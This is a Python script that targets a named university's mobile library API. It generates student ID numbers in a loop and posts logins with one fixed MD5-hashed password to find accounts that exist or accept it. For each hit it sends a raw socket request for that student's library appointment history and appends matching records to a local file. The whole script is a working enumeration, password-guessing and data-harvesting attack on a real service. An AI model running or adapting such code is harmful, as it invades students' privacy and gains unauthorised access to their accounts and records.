#!/usr/bin/env python
# -*- coding: utf-8 -*-

import sys
import time
import socket
import requests
from datetime import datetime, timedelta
from time import sleep
import simplejson



 

a=b=c=i=0
one=1


def printcn(b):         #配置中文输出函数
    sys_encoding = sys.getfilesystemencoding()
    print(b.decode('utf-8').encode(sys_encoding))

   
    reload(sys)
    sys.setdefaultencoding("utf-8")

def xhjc():
    url = 'http://mob.huanghuai.edu.cn/huanghuai/booksLogin'
    headers = {'cache':'60','Cache-Control':'max-age=2592000','Content-Type':'application/x-www-form-urlencoded','Content-Length':'60','Host':'mob.huanghuai.edu.cn','Connection':'Keep-Alive','Accept-Encoding':'gzip','User-Agent':'okhttp/3.9.0'}
    data = {'jszh':'YKT'+str(xh)+'','password':'202cb962ac59075b964b07152d234b70'}
    Soj_session = requests.session()
    res = Soj_session.post(url, data=data, headers=headers)
    nr=res.text 

    if '-2' in nr:
          print 'xxx'+str(xh)
          return 0
    if '-1' in nr:
          print 'vvv'+str(xh)
          return 1
    if  '0' in nr:
          print 'vvv'+str(xh)
          return 2




z=2599
x=100
xh='17'+str(z)+'0101'
while z<5000:
    z=z+1
    xh='17'+str(z)+'0101'

    if xhjc()>0:
       while x<900:
           x=x+1
           xh='17'+str(z)+'0'+str(x)
           if xhjc()>0:
               print '   '+str(xh)
               
     
 
   
               message ='GET http://mob.huanghuai.edu.cn/huanghuai/libraryAppointmentOrder_historyList?cardnum=YKT'+str(xh)+'&page=1&pageSize=5 HTTP/1.1\r\ncache: 0\r\nHost: mob.huanghuai.edu.cn\r\n\r\n'
               try:                 #创建socket
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
                    printcn("socket 接口创建" )
               except:
                    s.close()
                    printcn("socket  创建失败  "  )
          
                    continue
           
    
    
               if one:
                    one=0
                    try:                  #解析地址端口
                        host = 'mob.huanghuai.edu.cn'

                        remote_ip= socket.gethostbyname( host )
                        port = 80
                        socket.gethostbyname( host )
                        print remote_ip
        
                        printcn("解析服务器地址成功"    )     
                        printcn(  str(host) +  "  "  + str(remote_ip))
         
                    except:
                        s.close()
                        printcn("无法解析服务器地址 请检查网络")     
                        printcn("即将尝试重启socket")  
                        one=1   
                        continue
                       
    
               ip=remote_ip
    
               try:        # 连接服务器
        
                    s.connect((ip,80))
                    printcn("连接至服务器"   + str(remote_ip) +"成功"  ) 
               except:
                    printcn("服务器无法链接  检查服务器状态")     
                    printcn("即将尝试重启socket") 
                    s.close()
                    continue
    
    
	
	
     
               try :
                        #Set the whole string
                    printcn("数据即将发送 ")
                    s.sendall(message) 
           
                    printcn('数据已经发送  ')
               except:
                        #Send failed
         
                   printcn("发送失败" + str(c))
                   s.close()
                   continue
               reply = s.recv(4096)
               s.close()
               reply1=reply[295:]
               printcn (reply1)
  

    
        
               if '自习室' in reply:
                       print 'need'
                             #C:\Users\Administrator\Documents
                       file = open('/Users/Administrator/Documents/pz8152.txt','a')
        
                       file.write(xh+reply1)#
                       file.close() 
               else:
                       print  'not'   
       x=100
       

     
    
       
      

